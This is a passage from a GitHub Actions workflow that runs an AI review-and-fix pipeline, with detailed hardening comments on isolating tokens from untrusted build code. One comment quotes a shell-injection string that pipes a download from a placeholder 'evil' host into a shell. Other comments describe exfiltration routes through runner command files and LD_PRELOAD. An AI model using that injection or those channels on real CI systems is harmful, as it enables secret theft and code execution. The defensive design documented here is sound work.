          WORKER_FIX_CONTEXT: ${{ inputs.fix_context }}
          WORKER_IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
          # [issue #232] As in the review step above: the credential path is scoped to this step
          # rather than persisted job-wide. WORKER_PROVIDER is the FIXER's provider — worker-live.sh
          # refuses the run unless it EQUALS the implementer's (same-provider fix).
          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
          WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
          WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
          WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
        run: bash ../registry/scripts/worker-live.sh fix

      # [issue #91 review r2] SEAL THE FIX BEFORE THE HOSTILE GATE. worker-live.sh commits the
      # fixer's work locally — no token, git hooks neutralised — writes the single commit into a
      # git bundle, and RESTORES the pre-gate index so `run_gate`'s `git diff`/`git status`
      # selectors still see exactly the tree the model left (a committed tree would make the gate
      # vacuous). The commit SHA is recorded as a step output here, while this runner is still
      # clean, and the isolated `publish` job binds the artifact it downloads to that SHA.
      #
      # ORDERING CONSEQUENCE, stated because it is a real change: the refusals the old post-gate
      # push made (head drifted since dispatch, a model-edited `.beads`, an empty tree) now happen
      # HERE, so the gate is skipped rather than run-then-discarded. The outcome stays counted and
      # bounded — `gate_outcome` reads `skipped`, which `fix-outcome` already treats as the
      # not-green case and marks `gatefail` — and the commonest of them, a drifted head, still
      # exits ahead of that at fix-outcome's own live-head revalidation.
      - name: Seal the fix commit as an inert bundle (pre-gate, no token)
        id: stage
        if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
        working-directory: target
        env:
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
          TARGET_BOT_LOGIN: ${{ steps.target.outputs.bot_login }}
          TARGET_BOT_ID: ${{ steps.target.outputs.bot_id }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_PR_NUMBER: ${{ inputs.pr_number }}
          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
          WORKER_FIX_ROUND: ${{ inputs.review_round }}
          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
        run: bash ../registry/scripts/worker-live.sh stage-fix

      # Uploaded PRE-GATE as well (same reasoning as worker.yml's publish bundle): the artifact
      # service takes its copy while the runner is clean, so a gate that later rewrites the
      # on-disk bundle changes nothing the publisher downloads — and if it replaced the artifact
      # anyway, the pre-gate SHA the publisher binds to refuses it. if-no-files-found: error keeps
      # a silently empty upload from becoming a silent no-push.
      - name: Upload the pre-gate fix bundle (inert data only)
        if: ${{ steps.stage.outcome == 'success' }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: fix-bundle-${{ github.run_id }}-${{ github.run_attempt }}
          path: ${{ runner.temp }}/registry-worker/fix-bundle
          if-no-files-found: error
          retention-days: 1

      # [issue #91 review r2] MOVED AHEAD OF THE GATE. Filing the model's declared follow-ups never
      # depended on the gate outcome (its `if:` reads `steps.fix.outcome` alone), so running it
      # here costs nothing and removes the second token-bearing step that used to sit after
      # target-controlled code had executed on this runner.
      - name: Create declared follow-up issues (discovered out-of-scope work)
        if: ${{ inputs.mode == 'fix' && steps.fix.outcome == 'success' }}
        continue-on-error: true
        env:
          GH_TOKEN: ${{ steps.app-token-fix.outputs.token }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: |
          set -uo pipefail
          python3 registry/scripts/worker-issue.py followup \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ needs.resolve.outputs.issue }}" \
            --spec-file "$WORKER_ROOT/followups.jsonl" || true

      # Persist a HOST-SIDE-rotated account credential so the next claim still authenticates
      # (issue #596). Rotation happens in worker-prep's pre-flight refresh, NOT in the container:
      # the credential file is bind-mounted read-only (issue #134), so the CLI's own in-place
      # refresh cannot happen there — which is exactly why this lane died. Still runs BEFORE the
      # gate: REGISTRY_SECRETS_PAT must never be live in a step that runs after hostile target code
      # executed on this runner (the fix-mode cargo gate below).
      - name: Write back a rotated full account credential
        # NO model-step guard (issue #596): see worker.yml — a host-side rotation must be
        # persisted even when the model step never ran, or the consumed grant strands the account.
        #
        # NO PREPARE-STEP GUARD EITHER (retro-review of #614): see the long note on the same step in
        # worker.yml. `steps.prepare.outcome == 'success'` made the write-back reachable only from
        # the success path of the very step that CONSUMES the one-time-use grant, so a failure after
        # the provider committed the rotation killed the account permanently. Keyed instead to the
        # account SELECTION; worker-live.sh's rotation marker decides whether anything needs
        # persisting, and with no marker this is a rotated=false no-op.
        if: ${{ always() && steps.selected.outcome == 'success' }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
          WORKER_SECRET_REF: ${{ steps.selected.outputs.secret_ref }}
          # [issue #232] See the same step in worker.yml: the mount-containment inputs are
          # step-scoped `env:` (never the `if:`), and are empty on the rescued no-mount path exactly
          # as they were when they rode the job-wide $GITHUB_ENV export.
          WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
          WORKER_CREDENTIAL_BASELINE: ${{ steps.prepare.outputs.credential_baseline }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_SECRETS_PAT: ${{ secrets.REGISTRY_SECRETS_PAT }}
        run: bash registry/scripts/worker-live.sh write-back

      # Model-access health (registry #32): capture the sanitized exit CLASS of whichever model step
      # (review or fix) ran so the separate no-target-code `model_health` job records it.
      # worker-live.sh sets WORKER_EXIT_CLASS (+ WORKER_RESET_HINT on session-limit) in
      # $GITHUB_ENV on a FAILED launch only; a successful model step means `success`. always()
      # with NO skipped-guard (review defect #4): both steps skipped after an acquired claim means
      # a pre-launch abort (prep/checkout failure) or timeout/cancellation — record class=unknown
      # (counted toward persistence, never a provider-outage) instead of recording nothing.
      - name: Capture model exit class
        id: exit-class
        if: ${{ always() }}
        env:
          REVIEW_OUTCOME: ${{ steps.review.outcome }}
          FIX_OUTCOME: ${{ steps.fix.outcome }}
        run: |
          set -uo pipefail
          if [[ "$REVIEW_OUTCOME" == "success" || "$FIX_OUTCOME" == "success" ]]; then
            cls=success
          elif [[ "$REVIEW_OUTCOME" == "skipped" && "$FIX_OUTCOME" == "skipped" ]]; then
            # Pre-launch abort/cancellation: no host-observed CLI exit exists. But worker-prep's
            # host-side credential pre-flight (issue #596) DOES classify its own failures and writes
            # WORKER_EXIT_CLASS before any model step can run — recording `unknown` over it would
            # discard the one signal that says "this account needs a re-mint".
            cls="${WORKER_EXIT_CLASS:-unknown}"
          else
            cls="${WORKER_EXIT_CLASS:-unknown}"
          fi
          # outcome_attempt: the attempt that produced this outcome — the recorder's dedup key
          # (review r1 of #425). Grouped redirect (SC2129): one append, three keys.
          {
            echo "class=$cls"
            echo "reset_hint=${WORKER_RESET_HINT:-}"
            echo "outcome_attempt=${GITHUB_RUN_ATTEMPT:-}"
          } >> "$GITHUB_OUTPUT"

      # [registry #596] A CREDENTIAL-OUTAGE launch failure must NOT consume a review round.
      # The round marker is written BEFORE the model runs, and the `outcome` job that would void it
      # is gated (job-level `if`) on a validated verdict / successful fix — so when the model launch
      # itself dies on the account credential (acct01's codex OAuth access token expires hourly while
      # the fleet stores a static snapshot of it; observed `model-exit-class=auth` on review-fix runs,
      # 5 auth vs 5 success in one window, then 2 more) the outcome job is SKIPPED and the round
      # stayed charged forever. Enough of those and a pure credential outage walked the PR through the
      # bounded round budget into a capacity park as if the reviewer had declined.
      #
      # It runs HERE, in the same job that charged the round, because this is the only place that both
      # sees the exit class and still runs when no verdict exists. The class gate lives in
      # worker-pr.is_credential_outage (pure + self-tested), NOT in this `if:` — a non-outage class is
      # a deliberate no-op, so `setup`/`unknown`/timeouts stay charged and the bounded-crash
      # accounting is unchanged. The review-scoped App token already present in this job (issues +
      # pull-requests write, NO target contents write) is exactly what round-record used, so no new
      # capability is introduced, and in review mode this job executes no target code.
      - name: Void the review round on a credential-outage exit (never a decline)
        id: round-void
        if: ${{ always() && inputs.mode == 'review' && steps.round.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-review.outputs.token }}
          EXIT_CLASS: ${{ steps.exit-class.outputs.class }}
        run: |
          python3 registry/scripts/worker-pr.py round-void \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --round "${{ inputs.review_round }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --bot-login "${{ steps.target.outputs.bot_login }}" \
            --exit-class "$EXIT_CLASS"

      # [issue #232 review r2] See the same step in worker.yml: the fix lane runs the TARGET's own
      # rustup pin and cargo gate on this runner, and $RUNNER_TEMP reaches every step whatever the
      # job environment says — so the account credential tree is removed here, before either of them
      # exists to discover it. `always()` so it also covers the review lane (no gate there, but a
      # failed or cancelled run leaves the same tree behind) and every failure path.
      - name: Purge the account credential tree before any target-controlled code
        id: purge
        if: ${{ always() }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: bash registry/scripts/worker-live.sh purge-credentials

      - name: Ensure a Rust toolchain for the crate-scoped gate
        if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
        working-directory: target
        run: |
          set -uo pipefail
          command -v rustup >/dev/null 2>&1 || { echo '::error::rustup not found on the runner'; exit 1; }
          rustup show active-toolchain >/dev/null 2>&1 || rustup default stable
          rustup show >/dev/null 2>&1 || true
          rustup component add clippy rustfmt >/dev/null 2>&1 || true
          cargo --version; rustc --version

      - name: Run policy-selected local gate on the fix
        id: gate
        if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
        working-directory: target
        env:
          TARGET_DIR: ${{ github.workspace }}/target
          GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
          WORKER_PACKAGES: ${{ needs.resolve.outputs.packages }}
          # [issue #91] Same quarantine as worker.yml's gate step, which this lane had not
          # inherited. The fix lane runs the SAME `worker-live.sh gate` on the SAME target
          # checkout, so it executes the same target-controlled build scripts and tests as the
          # runner user — and it is the WEAKER position of the two, because a write-capable
          # GH_TOKEN step (`push`) still follows the gate in this job. So the runner command files
          # go: $GITHUB_ENV / $GITHUB_PATH are the cross-step primitives (BASH_ENV, LD_PRELOAD,
          # an attacker binary ahead of the system python3), and $GITHUB_STEP_SUMMARY /
          # $GITHUB_OUTPUT are the exfiltration ones ($GITHUB_STEP_SUMMARY is retained and
          # rendered on the run page, and base64 defeats GitHub's exact-secret masking). Nothing
          # legitimate is lost: the gate reports through its exit status alone, and only
          # `steps.gate.outcome` is read downstream — never `steps.gate.outputs`.
          #
          # [issue #91 review r1] AND IT IS NOT A BOUNDARY. Rebinding these four variables is
          # ENV-LEVEL only: it removes the channel from every actor that reaches a command file the
          # documented way (the environment), which is every build script, test harness and action
          # that writes one. It is NOT containment. The gate's code runs as the SAME runner user,
          # the runner's REAL command files still sit under $RUNNER_TEMP/_runner_file_commands/
          # (set_env_*, add_path_*, step_summary_*), and code that enumerates that directory can
          # append to them directly — the runner consumes them at step end whatever this step's
          # environment said. A workflow cannot prevent a same-uid write; only a real boundary can.
          #
          # [issue #91 review r2] AND THAT BOUNDARY NOW EXISTS HERE TOO. This lane used to be the
          # weaker of the two — a write-capable GH_TOKEN `push` step, plus the follow-up issue
          # step, ran AFTER the gate on this runner, so command-file poisoning had a token-bearing
          # target to aim at. Both are gone: the follow-ups moved ahead of the gate and the push
          # moved into the isolated `publish` job below, on a fresh runner, taking only host-derived
          # inputs and a commit SHA recorded before this step ran. NOTHING TOKEN-BEARING FOLLOWS THE
          # GATE in this job (#575's property, now asserted live on BOTH workflow files by
          # `_tokens_after_gate`), and this job's own App token no longer carries target contents
          # write at all. Read the four lines below as defence-in-depth behind that, never as
          # containment.
          GITHUB_ENV: ${{ runner.temp }}/gate-quarantine/env
          GITHUB_PATH: ${{ runner.temp }}/gate-quarantine/path
          GITHUB_OUTPUT: ${{ runner.temp }}/gate-quarantine/output
          GITHUB_STEP_SUMMARY: ${{ runner.temp }}/gate-quarantine/step-summary
        run: bash ../registry/scripts/worker-live.sh gate

      # NOTHING TOKEN-BEARING FOLLOWS THE GATE (issues #575, #91). The commit/push to the PR head
      # branch used to live right here, with a contents/workflows-capable App token, after the gate
      # had already executed target-controlled build scripts and tests. It now runs in the isolated
      # `publish` job below, which executes no target code and reconstructs nothing: it pushes the
      # exact commit OBJECT sealed into the bundle BEFORE the gate, bound to the SHA this job
      # recorded pre-gate.

      - name: Cleanup isolated worker state
        if: ${{ always() }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
        run: rm -rf -- "$WORKER_ROOT"

  # ISSUE #91 (review round 2) — the isolated fix publisher, extending issue #575's worker-lane
  # split to this lane. The `run` job executes the target's own gate (arbitrary target-controlled
  # build scripts and tests) as the runner user; it used to then commit and push to the PR head
  # branch ON THAT SAME RUNNER with a contents/workflows-capable App token. Gated target code could
  # therefore aim at that token through every same-uid surface the gate has: the runner's real
  # command files under $RUNNER_TEMP/_runner_file_commands/ (poisoning $GITHUB_ENV/$GITHUB_PATH for
  # the later step, which the gate step's own env rebinding cannot prevent), the sibling
  # `registry/` checkout the publisher script is read from, `.git/hooks`, and any process the gate
  # detaches.
  #
  # This job closes all of them the way `outcome`/`model_health`/`release` already do: a FRESH
  # runner that executes NO target code and NO target-writable script. The model's work crosses as
  # INERT DATA — a git bundle holding one commit, sealed pre-gate — and nothing in it is executed:
  # `git fetch` from the bundle, then `git push` of the object.
  #
  # FAIL-CLOSED ORDERING: the bundle is bound to the PRE-GATE recorded commit SHA (and its parents,
  # committer identity and .beads policy re-asserted) BEFORE the App token is minted, so a
  # substituted, oversized, unreadable or drifted artifact never causes a push-capable token to
  # exist. Every refusal leaves `pushed` false, and `fix-outcome` in the `outcome` job then records
  # exactly what it records for a gate that did not pass: no reviewed-sha advance, and the sweep
  # re-plans on the next tick. There is deliberately NO fallback that pushes from the run runner.
  publish:
    name: Push the gated fix to the PR head (no target code runs here)
    # staged_sha is non-empty only when the PRE-GATE seal succeeded, so a review run, a fix that
    # made no changes, a detected injection, or a run that died before the fixer skips this job
    # entirely (empty outputs -> pushed=false).
    if: ${{ always() && needs.claim.outputs.acquired == 'true' && inputs.mode == 'fix' && needs.run.outputs.staged_sha != '' && needs.run.outputs.gate_outcome == 'success' }}
    needs: [resolve, claim, run]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
    # `dispatch-secrets` environment (deployment-branch policy: default branch only).
    environment: dispatch-secrets
    permissions:
      contents: read
    outputs:
      pushed: ${{ steps.push.outcome == 'success' && 'true' || 'false' }}
      # Issue #156: the exact commit the fix pushed. The fix-outcome revalidates the live head
      # against the head THIS run produced (this sha on a push, else the unchanged reviewed head)
      # so a stale re-review/needs-user never acts on a head another push produced.
      pushed_sha: ${{ steps.push.outputs.pushed_sha }}
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # The artifact is keyed on `github.run_id`.`github.run_attempt`, so a PARTIAL re-run (this
      # job alone, with the run job's results preserved) finds no artifact for the new attempt and
      # fails CLOSED to no push — never a push of a bundle another attempt sealed. A full re-run
      # re-executes the fixer and seals a fresh one.
      - name: Download the pre-gate fix bundle (pinned)
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          name: fix-bundle-${{ github.run_id }}-${{ github.run_attempt }}
          path: ${{ runner.temp }}/fix-bundle

      # Minted only after the artifact is on disk, and it is the FIRST push-capable token to exist
      # anywhere in this run: the `run` job's fix-scoped token is contents-READ. Same scopes the
      # old in-run push used, on a runner that has never executed target code.
      - name: Mint push-scoped App token for the verified fix (no target code has run here)
        id: app-token-publish
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: write
          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
          # branches touching .github/workflows/*.
          permission-workflows: write

      # Checked out at the DISPATCHED head sha — never at a ref name that could have moved, and
      # never at the run job's post-gate worktree, which is exactly the artefact this job exists to
      # distrust. fetch-depth: 0 because a push from a shallow clone can be refused by the remote.
      - name: Checkout the target PR head (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          ref: ${{ needs.resolve.outputs.head_sha }}
          path: target
          token: ${{ steps.app-token-publish.outputs.token }}
          fetch-depth: 0
          persist-credentials: false

      # worker-live.sh binds the downloaded bundle to the PRE-GATE recorded SHA (and re-asserts the
      # parents, the committer identity and the per-kind .beads policy) before it pushes anything;
      # any refusal fails this step, leaves `pushed` false and pushes nothing.
      - name: Verify the pre-gate bundle and push the fix commit
        id: push
        working-directory: target
        env:
          GH_TOKEN: ${{ steps.app-token-publish.outputs.token }}
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_DEFAULT_BRANCH: ${{ needs.run.outputs.target_default_branch }}
          TARGET_BOT_LOGIN: ${{ needs.run.outputs.target_bot_login }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_FIX_BUNDLE: ${{ runner.temp }}/fix-bundle/fix.bundle
          # PRE-GATE step outputs of the run job: captured by the runner before the hostile step
          # started, so nothing the gate did can have altered them.
          WORKER_STAGED_SHA: ${{ needs.run.outputs.staged_sha }}
          WORKER_STAGED_MERGE_HEAD: ${{ needs.run.outputs.staged_merge_head }}
          # Host-derived, from the pre-hostile `resolve` job and the workflow inputs.
          WORKER_PR_HEAD_BRANCH: ${{ needs.resolve.outputs.head_branch }}
          WORKER_PR_HEAD_SHA: ${{ needs.resolve.outputs.head_sha }}
          WORKER_FIX_ROUND: ${{ inputs.review_round }}
          WORKER_FIX_KIND: ${{ inputs.fix_kind }}
        run: bash ../registry/scripts/worker-live.sh publish-fix

  # Applies every durable mutation of a review/fix run: the registry verdict record, PR labels
  # and markers, the one-shot arm, and needs-user escalations. It is a SEPARATE job from `run`
  # because the run job executes model-authored target code host-side in fix mode (the cargo
  # gate): no registry-write token (github.token contents/issues write) and no post-hostile PR
  # mutation may share a runner with that execution — a poisoned checkout/$GITHUB_ENV/lingering
  # process there could otherwise hijack them. This job checks out FRESH registry code and
  # executes no target code.
  #
  # Liveness ordering (crash-window hardening): 1) the durable registry verdict record,
  # 2) findings + outcome labels (or arm), 3) the reviewed-sha bind LAST. A crash between any
  # two leaves reviewed-sha != head, so the sweep re-derives the PR next tick (bounded by the
  # pre-model round marker + max_review_rounds) instead of a silent permanent stall; the arm
  # path additionally restores the draft state if the latch mutation fails after `pr ready`.
  outcome:
    name: Apply ${{ inputs.mode }} outcome (no target code runs here)
    # [issue #91 review r2] `publish` joins the needs so this job observes the push it now owns.
    # The `if:` below is unchanged and still keyed on the `run` job alone — a publish that was
    # skipped or refused must NOT suppress the outcome record, it must be recorded as pushed=false
    # exactly as a red gate always was.
    needs: [resolve, claim, run, publish]
    # Issue #560 adds the third admission: a fix run that STAGED NOTHING (verdict_stale_reason
    # non-empty) skips the fix step, so fix_done is 'skipped' and this job used to be skipped with
    # it — which is exactly why the PR kept review:changes and the fix lane re-admitted it forever.
    # The lane hand-over below is the only step that runs on that path.
    #
    # [registry #972] adds the FOURTH admission, for the same class of defect one layer earlier: a
    # target-identity refusal kills the `run` job BEFORE any of the three outputs above can be
    # bound, so this job was SKIPPED — no verdict, no round, no `review:*` transition — and the
    # next dispatch tick re-derived a byte-identical world and re-launched the identical run,
    # forever. `always()` was already here and was never the defect; the CONJUNCT was. The
    # refusal-recording step below is the only step that runs on that path.
    if: ${{ always() && needs.claim.outputs.acquired == 'true' && (needs.run.outputs.verdict_ok == 'success' || needs.run.outputs.fix_done == 'success' || needs.run.outputs.verdict_stale_reason != '' || needs.run.outputs.identity_refusal != '') }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + PROVENANCE_SALT, which
    # live in the `dispatch-secrets` environment (deployment-branch policy: default branch only)
    # — full rationale on the `claim` job in dispatch.yml.
    environment: dispatch-secrets
    permissions:
      contents: write   # write: record the validated verdict in the registry (github.token)
      issues: write     # write: ops-alert upsert in the registry on needs-user escalation
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      # [registry #972] `identity_refusal == ''` is LOAD-BEARING, not cosmetic: on the refusal path
      # this job now runs in `review` mode with an EMPTY verdict handoff, so without the conjunct
      # this step fails ("verdict handoff is empty") and takes the whole job — and therefore the
      # refusal record — down with it, restoring the very loop #972 closes. Every later step is
      # already gated on `steps.reverify.outcome == 'success'`, so `skipped` keeps them all off.
      - name: Reconstruct and re-validate the verdict on fresh registry code
        id: reverify
        if: ${{ inputs.mode == 'review' && needs.run.outputs.identity_refusal == '' }}
        env:
          VERDICT_B64: ${{ needs.run.outputs.verdict_b64 }}
          FILES_B64: ${{ needs.run.outputs.files_b64 }}
        run: |
          set -euo pipefail
          [[ -n "$VERDICT_B64" && -n "$FILES_B64" ]] || { echo '::error::verdict handoff is empty'; exit 1; }
          base64 -d <<< "$VERDICT_B64" > "$RUNNER_TEMP/review-verdict.json"
          base64 -d <<< "$FILES_B64" > "$RUNNER_TEMP/pr-files.txt"
          python3 registry/scripts/worker-pr.py validate-verdict \
            --verdict-file "$RUNNER_TEMP/review-verdict.json" \
            --files-file "$RUNNER_TEMP/pr-files.txt"

      # FIRST durable mutation: the registry verdict record (fixer input + audit trail). Written
      # before any PR mutation so every later step is re-derivable from durable state.
      - name: Record the validated verdict in the registry
        if: ${{ inputs.mode == 'review' && steps.reverify.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          python3 registry/scripts/worker-pr.py verdict-record \
            --registry-repo "$GITHUB_REPOSITORY" \
            --target-repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --round "${{ inputs.review_round }}" \
            --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}" \
            --verdict-file "$RUNNER_TEMP/review-verdict.json"

      - name: Mint outcome-scoped App token (PR labels/comments only, no target contents)
        id: app-token-outcome
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-issues: write
          permission-pull-requests: write

      # [registry #972] THE EXIT. The `run` job's target-identity gate refused this run before the
      # reviewer launched; that refusal is correct and is NOT relaxed anywhere in this PR. What
      # this step adds is that it is now RECORDED: one census row naming the refusal code, and one
      # terminal question-class park (`review:needs-user` + `needs:user`, park cause
      # `target-identity`) so the world the next dispatch tick reads has CHANGED. No review round
      # is charged — `round-record` never ran, no reviewer launched, and charging one would route
      # the PR into the CAPACITY `budget` park whose automatic re-admission would hand it straight
      # back to the identical refusal. Full argument in worker-pr.identity_refusal.
      #
      # The cap is ONE per (PR, reason), enforced by the durable receipt inside that function, not
      # by this `if:` — a re-run of this job re-reads the receipt and writes nothing.
      - name: Record the target-identity refusal (terminal, counted, no round charged)
        if: ${{ needs.run.outputs.identity_refusal != '' }}
        env:
          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_ALERT_TOKEN: ${{ github.token }}
          # Privacy routing (locked decision 22c), same posture as every other alert site here.
          ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
          ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
          MAINTAINER_HANDLE: jeswr
          # Workflow-derived value reaches the CLI via env ONLY — never interpolated into this
          # `run:` shell source (issue #199). The CLI re-validates it against the closed
          # IDENTITY_REFUSAL_REASONS enum and REFUSES anything outside it.
          IDENTITY_REFUSAL: ${{ needs.run.outputs.identity_refusal }}
        run: |
          # --bot-login is the login that AUTHORS the receipt (this job's own outcome-scoped App
          # token), NOT `needs.resolve.outputs.pr_author`: the receipt reader's trust filter has
          # to match the writer, and on the whole #657 class the PR author is a human while the
          # comment is posted by the App. Getting this wrong would silently disable the
          # idempotence check — it could never find its own receipt.
          python3 registry/scripts/worker-pr.py identity-refusal \
            --repo "${{ inputs.target_repo }}" \
            --pr "${{ inputs.pr_number }}" \
            --issue "${{ needs.resolve.outputs.issue }}" \
            --bot-login "${{ steps.app-token-outcome.outputs.app-slug }}[bot]" \
            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
            --reason "$IDENTITY_REFUSAL"

      - name: Apply the review outcome (findings, labels, escalation)
        id: outcome
        if: ${{ inputs.mode == 'review' && steps.reverify.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_ALERT_TOKEN: ${{ github.token }}
          # Privacy routing (locked decision 22c): maintainer-set ALERT_REPO sends the
          # account-enumerating ops alert to a private repo; unset falls back to the registry.
          ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
          ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
          MAINTAINER_HANDLE: jeswr
          SECURITY: ${{ needs.resolve.outputs.security }}
          # [OPUS-4.8] B3: the target policy row's security_paths (base64 JSON list). Each path
          # becomes a --surface-path so a trust-surface diff routes its arm to a human.
          SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
          # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
          # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
          # [#657] Resolved HOST-SIDE in the resolve job (from the master-protected allowlist +
          # the ledger record), never from a workflow input: the class decides whether the draft
          # freshness requirement applies and whether an approve may arm.
          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
        run: |
          set -euo pipefail
          args=(
            review-outcome
            --repo "${{ inputs.target_repo }}"
            --pr "${{ inputs.pr_number }}"
            --verdict-file "$RUNNER_TEMP/review-verdict.json"
            --files-file "$RUNNER_TEMP/pr-files.txt"
            --round "${{ inputs.review_round }}"
            --max-rounds "${{ needs.resolve.outputs.max_review_rounds }}"
            --issue "${{ needs.resolve.outputs.issue }}"
            --impl-provider "$IMPL_PROVIDER"
            --bot-login "${{ needs.resolve.outputs.pr_author }}"
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
            --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
          )
          [[ "$SECURITY" == "true" ]] && args+=(--security)
          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
          while IFS= read -r p; do
            [[ -n "$p" ]] && args+=(--surface-path "$p")
          done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
          python3 registry/scripts/worker-pr.py "${args[@]}"

      - name: Mint arm-scoped App token (approve path only)
        id: app-token-arm
        if: ${{ inputs.mode == 'review' && steps.outcome.outputs.decision == 'arm' }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: write
          permission-issues: write
          permission-pull-requests: write
          permission-workflows: write

      - name: Ready + arm (host-only, one-shot, sha-bound, hash-asserted)
        id: arm
        if: ${{ inputs.mode == 'review' && steps.outcome.outputs.decision == 'arm' }}
        env:
          GH_TOKEN: ${{ steps.app-token-arm.outputs.token }}
          # Reviewer handle via env (never argv — argv is echoed into public logs); compared to
          # the recorded implementer hash under PROVENANCE_SALT (locked decision 22a). This job
          # runs no target code, so the salt cannot leak to hostile execution.
          WORKER_REVIEWER_ACCOUNT: ${{ needs.claim.outputs.account }}
          PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
          REGISTRY_REPO: ${{ github.repository }}
          REGISTRY_ALERT_TOKEN: ${{ github.token }}
          ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
          ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
          MAINTAINER_HANDLE: jeswr
          # [OPUS-4.8] B3, revised per Decision 7 (2026-07-18): the LIVE trust-surface
